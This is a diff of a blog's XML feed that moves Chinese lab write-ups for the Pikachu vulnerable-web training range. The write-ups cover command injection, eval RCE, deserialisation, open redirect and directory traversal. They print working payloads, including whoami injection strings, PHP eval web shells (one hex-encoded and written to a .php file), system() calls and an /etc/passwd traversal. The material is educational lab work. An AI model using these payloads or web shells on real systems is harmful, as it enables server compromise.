@@ -110,6 +110,61 @@
       </categories>
   </entry>
   <entry>
+    <title>pikachu靶场系列-RCE</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/RCE/</url>
+    <content><![CDATA[<h1 id="RCE概述"><a href="#RCE概述" class="headerlink" title="RCE概述"></a>RCE概述</h1><p>remote command&#x2F;code execute</p>
+<p>也叫做远程命令执行或远程代码执行</p>
+<p>在实际中这可以归为最严重的漏洞，因为其可以获取到服务器权限</p>
+<p>一些反序列化，远程调用等，只要能够执行系统命令，都可以归为RCE</p>
+<p>比如log4j</p>
+<h1 id="ping-RCE"><a href="#ping-RCE" class="headerlink" title="ping RCE"></a>ping RCE</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images%5Cimage-20230110095547449.png" alt="image-20230110095547449"></p>
+<p>此时在服务器上执行的命令为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>然后将结果显示在前端</p>
+<p>于是我们可以构造命令拼接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.baidu.com&amp;&amp;whoami</span><br></pre></td></tr></table></figure>
+
+<p>&amp;&amp;就是“与”</p>
+<p><img src="/images%5Cimage-20230110095812452.png" alt="image-20230110095812452"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a||whoami</span><br></pre></td></tr></table></figure>
+
+<p>||就是“或”</p>
+<p><img src="/images%5Cimage-20230110095858437.png" alt="image-20230110095858437"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令A &amp;&amp; 命令B			# 只有前面的命令执行成功后才会执行后面的命令</span><br><span class="line">命令A &amp; 命令B			# 无论前面的命令执行成功或失败，总会执行后面的命令</span><br><span class="line">命令A || 命令B			# 当前面的命令执行失败才会执行后面的命令</span><br><span class="line">命令A | 命令B			# 前面的命令执行的输出作为后面命令执行的输入</span><br><span class="line">命令A ; 命令B			# 两条命令互不干扰</span><br></pre></td></tr></table></figure>
+
+<h3 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- Windows</span><br><span class="line">	# 使用 ^ 对 &lt; 进行转义</span><br><span class="line">	echo ^&lt;?php @eval($_POST[x])?^&gt; &gt; /xxx/xxx/x.php</span><br><span class="line"></span><br><span class="line">- Linux</span><br><span class="line">	# 将一句话马转换为十六进制</span><br><span class="line">	原: &lt;?php @eval($_POST[x]);?&gt;</span><br><span class="line">	现: echo 3c3f70687020406576616c28245f504f53545b785d293f3e|xxd -r -ps  &gt; /xxx/xxx/x.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>可以看一下服务端的源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;ipaddress&#x27;]!=null)&#123;</span><br><span class="line">    $ip=$_POST[&#x27;ipaddress&#x27;];</span><br><span class="line">//     $check=explode(&#x27;.&#x27;, $ip);可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255</span><br><span class="line">    if(stristr(php_uname(&#x27;s&#x27;), &#x27;windows&#x27;))&#123;</span><br><span class="line">//         var_dump(php_uname(&#x27;s&#x27;));</span><br><span class="line">        $result.=shell_exec(&#x27;ping &#x27;.$ip);//直接将变量拼接进来，没做处理</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        $result.=shell_exec(&#x27;ping -c 4 &#x27;.$ip);</span><br><span class="line">                $result.=shell_exec(&#x27;ping -c 4 1.1.1.1 &amp; whoami);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接通过shell_exec执行系统命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell_exec(&#x27;ping -c 4 &#x27;.$ip);</span><br></pre></td></tr></table></figure>
+
+<p>没有任何过滤，所以可以造成拼接</p>
+<h5 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo shell_exec(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images%5Cimage-20230110100607751.png" alt="image-20230110100607751"></p>
+<h1 id="eval-RCE"><a href="#eval-RCE" class="headerlink" title="eval RCE"></a>eval RCE</h1><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>可以看下源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;txt&#x27;] != null)&#123;</span><br><span class="line">    if(@!eval($_POST[&#x27;txt&#x27;]))&#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;你喜欢的字符还挺奇怪的!&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>@表示忽略报错</p>
+<p>!表示“非”</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@!eval()</span><br></pre></td></tr></table></figure>
+
+<p>在命令执行时就会返回1(无论是否执行成功)，表示ture，输出“你喜欢的字符还挺奇怪的!”</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>直接执行php代码即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images%5Cimage-20230110101728753.png" alt="image-20230110101728753"></p>
+]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
     <title>pikachu靶场系列-SSRF</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/SSRF/</url>
     <content><![CDATA[<h1 id="SSRF概述"><a href="#SSRF概述" class="headerlink" title="SSRF概述"></a>SSRF概述</h1><h3 id="服务端请求伪造"><a href="#服务端请求伪造" class="headerlink" title="服务端请求伪造"></a>服务端请求伪造</h3><p>字面意思就是伪造一个服务端请求，即攻击者借由服务端为跳板来攻击目标系统。</p>
@@ -236,61 +291,6 @@
       </categories>
   </entry>
   <entry>
-    <title>pikachu靶场系列-RCE</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/RCE/</url>
-    <content><![CDATA[<h1 id="RCE概述"><a href="#RCE概述" class="headerlink" title="RCE概述"></a>RCE概述</h1><p>remote command&#x2F;code execute</p>
-<p>也叫做远程命令执行或远程代码执行</p>
-<p>在实际中这可以归为最严重的漏洞，因为其可以获取到服务器权限</p>
-<p>一些反序列化，远程调用等，只要能够执行系统命令，都可以归为RCE</p>
-<p>比如log4j</p>
-<h1 id="ping-RCE"><a href="#ping-RCE" class="headerlink" title="ping RCE"></a>ping RCE</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.baidu.com</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images%5Cimage-20230110095547449.png" alt="image-20230110095547449"></p>
-<p>此时在服务器上执行的命令为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure>
-
-<p>然后将结果显示在前端</p>
-<p>于是我们可以构造命令拼接</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.baidu.com&amp;&amp;whoami</span><br></pre></td></tr></table></figure>
-
-<p>&amp;&amp;就是“与”</p>
-<p><img src="/images%5Cimage-20230110095812452.png" alt="image-20230110095812452"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a||whoami</span><br></pre></td></tr></table></figure>
-
-<p>||就是“或”</p>
-<p><img src="/images%5Cimage-20230110095858437.png" alt="image-20230110095858437"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令A &amp;&amp; 命令B			# 只有前面的命令执行成功后才会执行后面的命令</span><br><span class="line">命令A &amp; 命令B			# 无论前面的命令执行成功或失败，总会执行后面的命令</span><br><span class="line">命令A || 命令B			# 当前面的命令执行失败才会执行后面的命令</span><br><span class="line">命令A | 命令B			# 前面的命令执行的输出作为后面命令执行的输入</span><br><span class="line">命令A ; 命令B			# 两条命令互不干扰</span><br></pre></td></tr></table></figure>
-
-<h3 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- Windows</span><br><span class="line">	# 使用 ^ 对 &lt; 进行转义</span><br><span class="line">	echo ^&lt;?php @eval($_POST[x])?^&gt; &gt; /xxx/xxx/x.php</span><br><span class="line"></span><br><span class="line">- Linux</span><br><span class="line">	# 将一句话马转换为十六进制</span><br><span class="line">	原: &lt;?php @eval($_POST[x]);?&gt;</span><br><span class="line">	现: echo 3c3f70687020406576616c28245f504f53545b785d293f3e|xxd -r -ps  &gt; /xxx/xxx/x.php</span><br></pre></td></tr></table></figure>
-
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>可以看一下服务端的源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;ipaddress&#x27;]!=null)&#123;</span><br><span class="line">    $ip=$_POST[&#x27;ipaddress&#x27;];</span><br><span class="line">//     $check=explode(&#x27;.&#x27;, $ip);可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255</span><br><span class="line">    if(stristr(php_uname(&#x27;s&#x27;), &#x27;windows&#x27;))&#123;</span><br><span class="line">//         var_dump(php_uname(&#x27;s&#x27;));</span><br><span class="line">        $result.=shell_exec(&#x27;ping &#x27;.$ip);//直接将变量拼接进来，没做处理</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        $result.=shell_exec(&#x27;ping -c 4 &#x27;.$ip);</span><br><span class="line">                $result.=shell_exec(&#x27;ping -c 4 1.1.1.1 &amp; whoami);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>直接通过shell_exec执行系统命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell_exec(&#x27;ping -c 4 &#x27;.$ip);</span><br></pre></td></tr></table></figure>
-
-<p>没有任何过滤，所以可以造成拼接</p>
-<h5 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo shell_exec(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images%5Cimage-20230110100607751.png" alt="image-20230110100607751"></p>
-<h1 id="eval-RCE"><a href="#eval-RCE" class="headerlink" title="eval RCE"></a>eval RCE</h1><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>可以看下源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; $_POST[&#x27;txt&#x27;] != null)&#123;</span><br><span class="line">    if(@!eval($_POST[&#x27;txt&#x27;]))&#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;你喜欢的字符还挺奇怪的!&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>@表示忽略报错</p>
-<p>!表示“非”</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@!eval()</span><br></pre></td></tr></table></figure>
-
-<p>在命令执行时就会返回1(无论是否执行成功)，表示ture，输出“你喜欢的字符还挺奇怪的!”</p>
-<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>直接执行php代码即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images%5Cimage-20230110101728753.png" alt="image-20230110101728753"></p>
-]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
     <title>pikachu靶场系列-php反序列化</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
     <content><![CDATA[<h2 id="以一道ctf题引出"><a href="#以一道ctf题引出" class="headerlink" title="以一道ctf题引出"></a>以一道ctf题引出</h2><p><a href="http://218.94.126.122:31005/Ge_t_The_Fl_ag.php?word=1">http://218.94.126.122:31005/Ge_t_The_Fl_ag.php?word=1</a></p>
@@ -367,6 +367,28 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class HACK</span><br><span class="line">&#123;</span><br><span class="line">    public $test = &quot;pikachu&quot;;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        echo &quot;6666666666666&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$demo=new HACK();</span><br><span class="line">$demo-&gt;test=&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line"></span><br><span class="line">$a=serialize($demo);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$pikachu=unserialize($a);</span><br><span class="line">echo $pikachu-&gt;test;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images%5Cimage-20230110145751955.png" alt="image-20230110145751955"></p>
+]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>pikachu靶场系列-不安全的URL跳转</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84URL%E8%B7%B3%E8%BD%AC/</url>
+    <content><![CDATA[<p>如果后端采用了前端传进来的参数作为跳转的目的地，又没有做判断就可能跳转到钓鱼网站等恶意链接。</p>
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/images%5Cimage-20230110155041071.png" alt="image-20230110155041071"></p>
+<p>点击最后一个参数</p>
+<p>获取url</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=i</span><br></pre></td></tr></table></figure>
+
+<p>url指定重定向后的网页</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=https://www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>重定向到百度</p>
+<p><img src="/images%5Cimage-20230110155158474.png" alt="image-20230110155158474"></p>
+<p>可以抓个包看看</p>
+<p><img src="/images%5Cimage-20230110155246615.png" alt="image-20230110155246615"></p>
+<p>可以看到302响应包中的location字段指向百度</p>
 ]]></content>
       <categories>
         <category>pikachu靶场系列</category>
@@ -1362,28 +1384,6 @@
       </categories>
   </entry>
   <entry>
-    <title>pikachu靶场系列-不安全的URL跳转</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84URL%E8%B7%B3%E8%BD%AC/</url>
-    <content><![CDATA[<p>如果后端采用了前端传进来的参数作为跳转的目的地，又没有做判断就可能跳转到钓鱼网站等恶意链接。</p>
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/images%5Cimage-20230110155041071.png" alt="image-20230110155041071"></p>
-<p>点击最后一个参数</p>
-<p>获取url</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=i</span><br></pre></td></tr></table></figure>
-
-<p>url指定重定向后的网页</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/urlredirect/urlredirect.php?url=https://www.baidu.com</span><br></pre></td></tr></table></figure>
-
-<p>重定向到百度</p>
-<p><img src="/images%5Cimage-20230110155158474.png" alt="image-20230110155158474"></p>
-<p>可以抓个包看看</p>
-<p><img src="/images%5Cimage-20230110155246615.png" alt="image-20230110155246615"></p>
-<p>可以看到302响应包中的location字段指向百度</p>
-]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
     <title>pikachu靶场系列-文件上传</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
     <content><![CDATA[<h1 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[123]);?&gt;</span><br></pre></td></tr></table></figure>
@@ -1779,30 +1779,6 @@
       </categories>
   </entry>
   <entry>
-    <title>pikachu靶场系列-目录遍历</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/</url>
-    <content><![CDATA[<p>目录遍历，这里更像是路径穿越</p>
-<p>很像本地文件包含</p>
-<p>如果是linux系统，可以访问</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这里可以看下源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;title&#x27;]))&#123;</span><br><span class="line">    $filename=$_GET[&#x27;title&#x27;];</span><br><span class="line">    //这里直接把传进来的内容进行了require(),造成问题</span><br><span class="line">    require &quot;soup/$filename&quot;;</span><br><span class="line">//    echo $html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>require()也是用于文件包含的函数</p>
-<p>和include()的区别在于</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include() 出错仅是警告，脚本继续执行 </span><br><span class="line">require() 出错则爆出致命错误，脚本立刻终止 </span><br></pre></td></tr></table></figure>
-
-<p>所以这里当作文件包含利用即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/dir/dir_list.php?title=../../../shell.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images%5Cimage-20230110143442285.png" alt="image-20230110143442285"></p>
-]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
     <title>pikachu靶场系列-环境部署</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/</url>
     <content><![CDATA[<p>linux上可使用宝塔进行部署</p>
@@ -1826,6 +1802,30 @@
 <p><img src="/images%5C1660097734927-34555e1f-0b21-46b1-a457-0f6ce355a83a.png" alt="img"></p>
 <p><a href="http://127.0.0.1/DX/pikachu/install.php#">http://127.0.0.1/pikachu(自己命名的路径)/install.php</a></p>
 <p><img src="/images%5C1660097763217-bca63c0b-9f98-4260-9dda-9819b9c8b394.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>pikachu靶场系列-目录遍历</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/</url>
+    <content><![CDATA[<p>目录遍历，这里更像是路径穿越</p>
+<p>很像本地文件包含</p>
+<p>如果是linux系统，可以访问</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这里可以看下源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;title&#x27;]))&#123;</span><br><span class="line">    $filename=$_GET[&#x27;title&#x27;];</span><br><span class="line">    //这里直接把传进来的内容进行了require(),造成问题</span><br><span class="line">    require &quot;soup/$filename&quot;;</span><br><span class="line">//    echo $html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>require()也是用于文件包含的函数</p>
+<p>和include()的区别在于</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include() 出错仅是警告，脚本继续执行 </span><br><span class="line">require() 出错则爆出致命错误，脚本立刻终止 </span><br></pre></td></tr></table></figure>
+
+<p>所以这里当作文件包含利用即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/dir/dir_list.php?title=../../../shell.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images%5Cimage-20230110143442285.png" alt="image-20230110143442285"></p>
 ]]></content>
       <categories>
         <category>pikachu靶场系列</category>
